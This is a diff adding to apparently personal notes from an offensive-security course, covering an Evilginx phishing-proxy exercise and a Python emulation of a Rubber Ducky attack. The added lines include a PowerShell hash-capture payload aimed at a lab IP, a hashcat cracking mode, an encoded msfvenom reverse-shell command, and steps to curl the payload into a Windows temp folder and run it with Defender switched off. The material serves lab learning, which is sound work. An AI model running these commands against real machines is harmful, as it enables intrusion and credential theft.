@@ -409,6 +409,7 @@ Methodology :
 
 Place the 0365.yaml file in the Phislets folder
 
+([An0nUD4Y/Evilginx2-Phishlets: Evilginx3 Phishlets version (0.2.3 & above) Only For Testing/Learning Purposes (github.com)](https://github.com/An0nUD4Y/Evilginx2-Phishlets))
 
 The Kali Linux vm will be our Proxy Server. 
 
@@ -423,3 +424,50 @@ This exercise will help a ton in our assignment
 The host file should be changed to adapt to the victim. The pc when trying to reach a website checks the host file first before the DNS. 
 
 Subdomain in the host file does nto have to be a login. Adapt it in style to the intended destination ( for the victim )
+
+
+
+## Exercise - Rubber  Ducky Emulation
+
+Why emulation  
+
+● Rubber duckys are expensive  
+● We can use python instead
+
+Results
+
+	whoami 
+	desktop-user\beard
+	PS C:\Users\beard
+	
+Getting Hashes  
+
+>[!command]
+	# Payloads
+>	 shell = "powershell.exe"
+>	 payload = "net view \\\\192.168.42.82\\temp"
+
+Hashcat -m 2100
+
+### Instructions 
+
+1. Create a Windows VM from scratch (Windows  
+pro or education edition)  
+2. Create a local admin user  
+a. Turn off Defender AV  
+3. Install Python onto the VM  
+a. Add python to path  
+4. Use msfvenom on Kali to make a  
+windows/x64/shell_reverse_tcp exe payload  
+
+	msfvenom -p windows/shell/reverse_tcp  -e x86/shikata_ga_nai LHOST=192.168.126.141 LPORT=12345 -f exe -o ~/REVERSE_SHELL.exe
+
+5. Use python on kali to host a web server  
+6. Rewrite the ducky script to use curl to  
+download the script to c:\Windows\Temp  
+a. -o flag is useful  
+b. Will need to run the run_payload function more  
+than once  
+c. Good to sleep a bit in between commands to  
+ensure the payload is downloaded before  
+running
